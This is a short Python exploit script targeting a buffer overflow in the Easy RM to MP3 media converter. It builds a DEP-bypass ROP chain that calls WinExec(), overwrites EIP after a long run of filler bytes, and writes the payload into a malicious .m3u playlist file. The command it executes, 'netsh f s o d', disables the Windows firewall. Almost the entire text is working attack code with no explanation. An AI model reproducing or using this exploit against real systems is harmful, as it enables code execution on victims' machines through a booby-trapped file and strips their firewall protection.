#!/etc/Python
#By: Jb05s
#Purpose: Easy RM to MP3 DEP Bypass - WinExec()

import struct

"""
WinExec() Address = struct.pack('<L', 0x7C863231)
"""

WinExec = struct.pack('<L', 0x100109EC) #POP EBX; RETN
WinExec += struct.pack('<L', 0xFFFFFFFF) #0xFFFFFFFF = -1
WinExec += struct.pack('<L', 0x1001C1A5) #INC EBX --> EBX = 0 = HIDE
WinExec += struct.pack('<L', 0x10014F75) #POP EBP; RETN
WinExec += struct.pack('<L', 0xFFFFFFFF)
WinExec += struct.pack('<L', 0x10010C31) #POP ESI; RETN
WinExec += struct.pack('<L', 0x7C863231) #WinExec()
WinExec += struct.pack('<L', 0x1001C07F) #POP EDI; RETN
WinExec += struct.pack('<L', 0x1001C080) #RETN
WinExec += struct.pack('<L', 0x1002CC86) #PUSHAD; RETN

Cmd = "netsh f s o d"

pre = "\x41" * 26072
eip = struct.pack('<L', 0x100102DC) #RETN
post = struct.pack('<L', 0x41414141)
pad = "\x43" * (30000 - len(pre + eip + post + WinExec + Cmd))

buffer = pre + eip + post + WinExec + Cmd

exploit = buffer

filename = "jb05s3.m3u"
textfile = open(filename, "w")
textfile.write(exploit)
textfile.close()
